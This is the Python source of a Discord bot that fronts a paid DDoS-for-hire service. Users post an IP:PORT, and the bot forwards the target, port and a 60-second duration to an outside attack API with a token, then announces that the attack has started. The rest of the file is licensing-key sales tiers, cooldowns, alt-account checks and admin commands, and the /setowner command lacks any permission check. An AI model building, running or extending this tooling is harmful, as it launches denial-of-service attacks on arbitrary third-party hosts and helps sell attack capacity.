import discord
from discord.ext import commands
from discord import app_commands
import requests
import os
from dotenv import load_dotenv
import asyncio
import json
import time
import random
import string
import hashlib
from datetime import datetime, timedelta
import re

# Load environment variables
load_dotenv()

# Set up intents
intents = discord.Intents.default()
intents.message_content = True

# Bot setup - removed command prefix since we're using slash commands
bot = commands.Bot(command_prefix='/', intents=intents)

# Data files
DATA_FILE = 'bot_data.json'
KEYS_FILE = 'keys_data.json'
BANS_FILE = 'bans_data.json'
AUTH_FILE = 'authorized_users.json'

# Global variables
bot_start_time = time.time()
usage_count = 0
last_usage = {}
channel_types = {}  # channel_id: 'free' or 'premium'

def load_data():
    """Load bot data from file"""
    try:
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    except:
        return {
            'owner_id': None,
            'allowed_channels': [],
            'api_info': {'token': os.getenv('API_TOKEN'), 'expires': None}
        }

def save_data(data):
    """Save bot data to file"""
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def load_keys():
    """Load keys data from file"""
    try:
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {'free_keys': {}, 'premium_keys': {}}

def save_keys(keys_data):
    """Save keys data to file"""
    with open(KEYS_FILE, 'w') as f:
        json.dump(keys_data, f, indent=2)

def load_bans():
    """Load bans data from file"""
    try:
        with open(BANS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {'banned_users': []}

def save_bans(bans_data):
    """Save bans data to file"""
    with open(BANS_FILE, 'w') as f:
        json.dump(bans_data, f, indent=2)

def load_authorized_users():
    """Load authorized users from file"""
    try:
        with open(AUTH_FILE, 'r') as f:
            return json.load(f)
    except:
        return {'authorized_users': []}

def save_authorized_users(auth_data):
    """Save authorized users to file"""
    with open(AUTH_FILE, 'w') as f:
        json.dump(auth_data, f, indent=2)

def generate_secure_key(length=32):
    """Generate a secure random key"""
    chars = string.ascii_letters + string.digits
    key = ''.join(random.SystemRandom().choice(chars) for _ in range(length))
    return hashlib.sha256(key.encode()).hexdigest()[:16]

def is_valid_ip_port(text):
    """Check if text matches IP:PORT format"""
    pattern = r'^(\d{1,3}\.){3}\d{1,3}:\d{1,5}$'
    if re.match(pattern, text):
        parts = text.split(':')
        ip_parts = parts[0].split('.')
        port = int(parts[1])
        
        # Validate IP range
        if all(0 <= int(part) <= 255 for part in ip_parts) and 1 <= port <= 65535:
            return True
    return False

async def detect_alt_account(user_id, guild):
    """Advanced alt account detection"""
    try:
        member = guild.get_member(user_id)
        if not member:
            return False
            
        # Check account age (less than 30 days = suspicious)
        account_age = (datetime.now() - member.created_at).days
        if account_age < 30:
            return True
            
        # Check join date (recently joined = suspicious)
        join_age = (datetime.now() - member.joined_at).days
        if join_age < 7:
            return True
            
        # Check if user has default avatar
        if member.avatar is None:
            return True
            
    except:
        pass
    
    return False

def is_owner(user_id):
    """Check if user is bot owner"""
    data = load_data()
    return data['owner_id'] and user_id == data['owner_id']

def is_authorized(user_id):
    """Check if user is owner or authorized"""
    if is_owner(user_id):
        return True
    
    auth_data = load_authorized_users()
    return user_id in auth_data['authorized_users']

async def is_banned(user_id):
    """Check if user is banned"""
    bans_data = load_bans()
    return user_id in bans_data['banned_users']

def get_user_key_type(user_id):
    """Get user's key type (free/premium/none)"""
    keys_data = load_keys()
    
    # Check premium keys
    for key, info in keys_data['premium_keys'].items():
        if info['user_id'] == user_id:
            if datetime.now() < datetime.fromisoformat(info['expires']):
                return 'premium'
            else:
                # Remove expired key
                del keys_data['premium_keys'][key]
                save_keys(keys_data)
                
    # Check free keys
    for key, info in keys_data['free_keys'].items():
        if info['user_id'] == user_id:
            if datetime.now() < datetime.fromisoformat(info['expires']):
                return 'free'
            else:
                # Remove expired key
                del keys_data['free_keys'][key]
                save_keys(keys_data)
    
    return None

@bot.event
async def on_ready():
    # Set bot status to Do Not Disturb
    await bot.change_presence(status=discord.Status.dnd)
    print(f'{bot.user.name} ({bot.user.id}) is online!')
    print('Status: Do Not Disturb')
    print('------')
    
    # Sync slash commands
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(f"Failed to sync commands: {e}")

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    # Check if message contains IP:PORT format
    if is_valid_ip_port(message.content.strip()):
        await handle_ip_attack(message)
        return
    
    await bot.process_commands(message)

async def handle_ip_attack(message):
    """Handle IP:PORT attack without command"""
    global usage_count, last_usage
    
    user_id = message.author.id
    channel_id = message.channel.id
    
    # Check if user is banned
    if await is_banned(user_id):
        await message.add_reaction('❌')
        return
    
    # Check if channel is allowed
    data = load_data()
    if channel_id not in data['allowed_channels']:
        return
    
    # Alt account detection
    if await detect_alt_account(user_id, message.guild):
        await message.reply("Alt account detected!")
        return
    
    # Get user key type
    key_type = get_user_key_type(user_id)
    if not key_type:
        await message.reply("You don't have a valid key! Contact admin to get a key.")
        return
    
    # Check if user is owner (no cooldown for owners)
    is_owner_user = is_owner(message.author.id)
    
    # Cooldown check for non-owner users
    if not is_owner_user:
        if key_type == 'free':
            cooldown = 120  # 2 minutes
            if user_id in last_usage:
                time_passed = time.time() - last_usage[user_id]
                if time_passed < cooldown:
                    remaining = int(cooldown - time_passed)
                    await message.reply(f"Cooldown! Wait {remaining} seconds.")
                    return
    
    # Parse IP and PORT
    ip_port = message.content.strip()
    host, port = ip_port.split(':')
    port = int(port)
    
    # Set attack time immer auf 60 Sekunden
    attack_time = 60
    
    # Update usage tracking
    usage_count += 1
    last_usage[user_id] = time.time()
    
    # Animated booting message
    boot_msg = await message.reply("booting")
    
    # Booting animation loop (3 cycles)
    for cycle in range(3):
        await asyncio.sleep(0.8)
        await boot_msg.edit(content="booting.")
        await asyncio.sleep(0.8)
        await boot_msg.edit(content="booting..")
        await asyncio.sleep(0.8)
        await boot_msg.edit(content="booting...")
        await asyncio.sleep(0.8)
        await boot_msg.edit(content="booting")
    
    # API call
    data = load_data()
    api_token = data['api_info']['token']
    concs = 1
    url = f'https://tamixx.com/api?token={api_token}&host={host}&port={port}&time={attack_time}'
    
    try:
        response = requests.get(url, timeout=35)
        if response.status_code == 200:
            await boot_msg.edit(content=f"booted fck {host}:{port}")
            
            embed = discord.Embed(
                title="Attack Started!",
                color=0x00ff00,
                timestamp=datetime.now()
            )
            embed.add_field(name="Target", value=f"`{host}:{port}`", inline=True)
            embed.add_field(name="Time", value=f"`{attack_time}s`", inline=True)
            embed.add_field(name="Type", value=f"`{key_type.upper()}`", inline=True)
            embed.set_footer(text=f"User: {message.author.name}")
            
            await message.channel.send(embed=embed)
        else:
            # Versuche, die Fehlermeldung aus der API auszulesen
            try:
                error_msg = response.json().get('error', '')
            except Exception:
                error_msg = response.text
            await boot_msg.edit(content=f"API Error: {response.status_code} {error_msg}")
    except Exception as e:
        await boot_msg.edit(content="API connection error!")
        print(f'API Error: {e}')

# SLASH COMMANDS

# Owner Management Commands
@bot.tree.command(name="setowner", description="Set the bot owner")
async def set_owner(interaction: discord.Interaction, owner_id: str):
    try:
        owner_id = int(owner_id)
    except ValueError:
        await interaction.response.send_message("Invalid user ID!", ephemeral=True)
        return
    
    data = load_data()
    data['owner_id'] = owner_id
    save_data(data)
    await interaction.response.send_message(f"Owner ID set to: {owner_id}")

@bot.tree.command(name="deleteowner", description="Delete the bot owner")
async def delete_owner(interaction: discord.Interaction):
    if not is_owner(interaction.user.id):
        await interaction.response.send_message("Only the owner can use this command!", ephemeral=True)
        return
    
    data = load_data()
    data['owner_id'] = None
    save_data(data)
    await interaction.response.send_message("Owner ID deleted.")

# Authorization System
@bot.tree.command(name="authorize", description="Give a user permission to use owner commands")
async def authorize_user(interaction: discord.Interaction, user: discord.Member):
    if not is_owner(interaction.user.id):
        await interaction.response.send_message("Only the owner can use this command!", ephemeral=True)
        return
    
    auth_data = load_authorized_users()
    if user.id not in auth_data['authorized_users']:
        auth_data['authorized_users'].append(user.id)
        save_authorized_users(auth_data)
        await interaction.response.send_message(f"{user.mention} has been authorized to use owner commands!")
    else:
        await interaction.response.send_message(f"{user.mention} is already authorized!")

@bot.tree.command(name="deauthorize", description="Remove a user's permission to use owner commands")
async def deauthorize_user(interaction: discord.Interaction, user: discord.Member):
    if not is_owner(interaction.user.id):
        await interaction.response.send_message("Only the owner can use this command!", ephemeral=True)
        return
    
    auth_data = load_authorized_users()
    if user.id in auth_data['authorized_users']:
        auth_data['authorized_users'].remove(user.id)
        save_authorized_users(auth_data)
        await interaction.response.send_message(f"{user.mention} has been deauthorized!")
    else:
        await interaction.response.send_message(f"{user.mention} is not authorized!")

@bot.tree.command(name="keys", description="View all authorized users and keys")
async def view_keys(interaction: discord.Interaction):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("You don't have permission to use this command!", ephemeral=True)
        return
    
    auth_data = load_authorized_users()
    keys_data = load_keys()
    
    # Count active keys
    active_free = sum(1 for k, v in keys_data['free_keys'].items() 
                     if datetime.now() < datetime.fromisoformat(v['expires']))
    active_premium = sum(1 for k, v in keys_data['premium_keys'].items() 
                        if datetime.now() < datetime.fromisoformat(v['expires']))
    
    embed = discord.Embed(title="Authorization & Keys Overview", color=0x00ff00)
    
    # Authorized Users
    if auth_data['authorized_users']:
        auth_users = []
        for user_id in auth_data['authorized_users']:
            user = bot.get_user(user_id)
            if user:
                auth_users.append(f"• {user.mention} ({user.name})")
            else:
                auth_users.append(f"• <@{user_id}> (Unknown User)")
        embed.add_field(
            name="Authorized Users", 
            value="\n".join(auth_users) if auth_users else "None", 
            inline=False
        )
    else:
        embed.add_field(name="Authorized Users", value="None", inline=False)
    
    # Key Statistics
    embed.add_field(name="Active Free Keys", value=str(active_free), inline=True)
    embed.add_field(name="Active Premium Keys", value=str(active_premium), inline=True)
    embed.add_field(name="Total Active Keys", value=str(active_free + active_premium), inline=True)
    
    # Recent Keys (Last 5)
    recent_keys = []
    all_keys = list(keys_data['free_keys'].items()) + list(keys_data['premium_keys'].items())
    all_keys.sort(key=lambda x: x[1]['created'], reverse=True)
    
    for i, (key, info) in enumerate(all_keys[:5]):
        key_type = "Premium" if key in keys_data['premium_keys'] else "Free"
        user = bot.get_user(info['user_id']) if info['user_id'] else None
        user_name = user.name if user else "Unassigned"
        expires = datetime.fromisoformat(info['expires']).strftime("%m/%d")
        recent_keys.append(f"`{key[:8]}...` | {key_type} | {user_name} | Exp: {expires}")
    
    if recent_keys:
        embed.add_field(
            name="Recent Keys (Last 5)", 
            value="\n".join(recent_keys), 
            inline=False
        )
    
    embed.timestamp = datetime.now()
    embed.set_footer(text=f"Requested by {interaction.user.name}")
    
    await interaction.response.send_message(embed=embed)

# Channel Management
@bot.tree.command(name="addchannel", description="Add a channel to allowed list")
async def add_channel(interaction: discord.Interaction, channel: discord.TextChannel, channel_type: str = 'free'):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("You don't have permission to use this command!", ephemeral=True)
        return
    
    if channel_type not in ['free', 'premium']:
        await interaction.response.send_message("Channel type must be 'free' or 'premium'!", ephemeral=True)
        return
    
    data = load_data()
    if channel.id not in data['allowed_channels']:
        data['allowed_channels'].append(channel.id)
        save_data(data)
    
    channel_types[channel.id] = channel_type
    await interaction.response.send_message(f"Channel added: {channel.mention} ({channel_type})")

@bot.tree.command(name="removechannel", description="Remove a channel from allowed list")
async def remove_channel(interaction: discord.Interaction, channel: discord.TextChannel):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("You don't have permission to use this command!", ephemeral=True)
        return
    
    data = load_data()
    if channel.id in data['allowed_channels']:
        data['allowed_channels'].remove(channel.id)
        save_data(data)
        if channel.id in channel_types:
            del channel_types[channel.id]
    await interaction.response.send_message(f"Channel removed: {channel.mention}")

# Key Management
@bot.tree.command(name="keygen", description="Generate a new key")
async def generate_key(interaction: discord.Interaction, key_type: str, days: int, user: discord.Member = None):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("You don't have permission to use this command!", ephemeral=True)
        return
    
    if key_type not in ['free', 'premium']:
        await interaction.response.send_message("Key type must be 'free' or 'premium'!", ephemeral=True)
        return
    
    keys_data = load_keys()
    new_key = generate_secure_key()
    expires = datetime.now() + timedelta(days=days)
    
    key_info = {
        'created': datetime.now().isoformat(),
        'expires': expires.isoformat(),
        'user_id': user.id if user else None,
        'used': False
    }
    
    if key_type == 'free':
        keys_data['free_keys'][new_key] = key_info
    else:
        keys_data['premium_keys'][new_key] = key_info
    
    save_keys(keys_data)
    
    embed = discord.Embed(title="Key Generated", color=0x00ff00)
    embed.add_field(name="Key", value=f"`{new_key}`", inline=False)
    embed.add_field(name="Type", value=key_type.upper(), inline=True)
    embed.add_field(name="Duration", value=f"{days} days", inline=True)
    embed.add_field(name="Expires", value=expires.strftime("%Y-%m-%d %H:%M"), inline=True)
    
    if user:
        embed.add_field(name="Assigned to", value=user.mention, inline=True)
    
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="usekey", description="Activate a key")
async def use_key(interaction: discord.Interaction, key: str):
    keys_data = load_keys()
    user_id = interaction.user.id
    
    # Check if key exists in premium keys
    if key in keys_data['premium_keys']:
        key_info = keys_data['premium_keys'][key]
        if datetime.now() < datetime.fromisoformat(key_info['expires']):
            keys_data['premium_keys'][key]['user_id'] = user_id
            keys_data['premium_keys'][key]['used'] = True
            save_keys(keys_data)
            await interaction.response.send_message("Premium key activated successfully!")
            return
    
    # Check if key exists in free keys
    if key in keys_data['free_keys']:
        key_info = keys_data['free_keys'][key]
        if datetime.now() < datetime.fromisoformat(key_info['expires']):
            keys_data['free_keys'][key]['user_id'] = user_id
            keys_data['free_keys'][key]['used'] = True
            save_keys(keys_data)
            await interaction.response.send_message("Free key activated successfully!")
            return
    
    await interaction.response.send_message("Invalid or expired key!", ephemeral=True)

@bot.tree.command(name="delkey", description="Delete a key")
async def delete_key(interaction: discord.Interaction, key: str):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("You don't have permission to use this command!", ephemeral=True)
        return
    
    keys_data = load_keys()
    
    if key in keys_data['premium_keys']:
        del keys_data['premium_keys'][key]
        save_keys(keys_data)
        await interaction.response.send_message("Premium key deleted!")
    elif key in keys_data['free_keys']:
        del keys_data['free_keys'][key]
        save_keys(keys_data)
        await interaction.response.send_message("Free key deleted!")
    else:
        await interaction.response.send_message("Key not found!", ephemeral=True)

# Message Management
@bot.tree.command(name="clear", description="Clear messages from channel")
async def clear_messages(interaction: discord.Interaction, amount: int = 10):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("You don't have permission to use this command!", ephemeral=True)
        return
    
    if amount <= 0 or amount > 100:
        await interaction.response.send_message("Message amount must be between 1 and 100!", ephemeral=True)
        return
    
    try:
        # Delete specified amount of messages
        deleted = await interaction.channel.purge(limit=amount)
        
        # Send confirmation message
        await interaction.response.send_message(f"Deleted {len(deleted)} messages!", ephemeral=True)
        
    except discord.Forbidden:
        await interaction.response.send_message("I don't have permission to delete messages!", ephemeral=True)
    except discord.HTTPException:
        await interaction.response.send_message("Failed to delete messages!", ephemeral=True)

# Ban System
@bot.tree.command(name="ban", description="Ban a user from using the bot")
async def ban_user(interaction: discord.Interaction, user: discord.Member, reason: str = "No reason"):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("You don't have permission to use this command!", ephemeral=True)
        return
    
    bans_data = load_bans()
    if user.id not in bans_data['banned_users']:
        bans_data['banned_users'].append(user.id)
        save_bans(bans_data)
    
    await interaction.response.send_message(f"{user.mention} has been banned! Reason: {reason}")

@bot.tree.command(name="unban", description="Unban a user")
async def unban_user(interaction: discord.Interaction, user_id: str):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("You don't have permission to use this command!", ephemeral=True)
        return
    
    try:
        user_id = int(user_id)
    except ValueError:
        await interaction.response.send_message("Invalid user ID!", ephemeral=True)
        return
    
    bans_data = load_bans()
    if user_id in bans_data['banned_users']:
        bans_data['banned_users'].remove(user_id)
        save_bans(bans_data)
        await interaction.response.send_message(f"<@{user_id}> has been unbanned!")
    else:
        await interaction.response.send_message("User is not banned!", ephemeral=True)

# Stats Commands
@bot.tree.command(name="botstat", description="View bot statistics")
async def bot_stats(interaction: discord.Interaction):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("You don't have permission to use this command!", ephemeral=True)
        return
    
    uptime = time.time() - bot_start_time
    uptime_str = str(timedelta(seconds=int(uptime)))
    
    # Bot ping
    ping = round(bot.latency * 1000)
    
    embed = discord.Embed(title="Bot Statistics", color=0x00ff00)
    embed.add_field(name="Ping", value=f"{ping}ms", inline=True)
    embed.add_field(name="Uptime", value=uptime_str, inline=True)
    embed.add_field(name="Total Usage", value=str(usage_count), inline=True)
    embed.add_field(name="Servers", value=str(len(bot.guilds)), inline=True)
    embed.add_field(name="Users", value=str(len(bot.users)), inline=True)
    embed.add_field(name="Channels", value=str(len(list(bot.get_all_channels()))), inline=True)
    embed.timestamp = datetime.now()
    
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="botinfo", description="View detailed bot information")
async def bot_info(interaction: discord.Interaction):
    if not is_authorized(interaction.user.id):
        await interaction.response.send_message("You don't have permission to use this command!", ephemeral=True)
        return
    
    data = load_data()
    keys_data = load_keys()
    
    # Count active keys
    active_free = sum(1 for k, v in keys_data['free_keys'].items() 
                     if datetime.now() < datetime.fromisoformat(v['expires']))
    active_premium = sum(1 for k, v in keys_data['premium_keys'].items() 
                        if datetime.now() < datetime.fromisoformat(v['expires']))
    
    embed = discord.Embed(title="Bot Information", color=0x0099ff)
    embed.add_field(name="API Token", value=f"`{data['api_info']['token'][:20]}...`", inline=False)
    embed.add_field(name="Active Free Keys", value=str(active_free), inline=True)
    embed.add_field(name="Active Premium Keys", value=str(active_premium), inline=True)
    embed.add_field(name="Allowed Channels", value=str(len(data['allowed_channels'])), inline=True)
    embed.add_field(name="Owner ID", value=str(data['owner_id']), inline=True)
    embed.add_field(name="Banned Users", value=str(len(load_bans()['banned_users'])), inline=True)
    embed.add_field(name="Authorized Users", value=str(len(load_authorized_users()['authorized_users'])), inline=True)
    embed.timestamp = datetime.now()
    
    await interaction.response.send_message(embed=embed)

@bot.event
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message('You don\'t have permission to use this command!', ephemeral=True)
    elif isinstance(error, app_commands.CommandOnCooldown):
        await interaction.response.send_message(f'Command is on cooldown! Try again in {error.retry_after:.2f} seconds.', ephemeral=True)
    else:
        await interaction.response.send_message('An error occurred!', ephemeral=True)
        print(f'Slash command error: {error}')

# Initialize data on startup
load_data()
load_keys()
load_bans()
load_authorized_users()

# Run the bot
bot.run(os.getenv('DISCORD_TOKEN'))